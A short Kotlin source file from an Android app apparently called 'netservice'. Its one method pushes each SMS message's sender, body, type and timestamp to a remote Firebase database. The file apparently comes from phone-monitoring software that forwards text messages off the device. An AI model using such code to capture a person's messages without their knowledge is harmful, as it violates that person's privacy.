package com.dtz.netservice.services.sms

import android.content.Context
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.data.model.Sms
import com.dtz.netservice.services.base.BaseInteractorService
import com.dtz.netservice.utils.ConstFun.getDateTime
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.Consts.SMS
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String,type: Int) {
        val sms = Sms(smsAddress, smsBody, getDateTime(),type)
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms).addOnCompleteListener {
            if (isNullService()) getService()!!.stopServiceSms()
        }
    }

}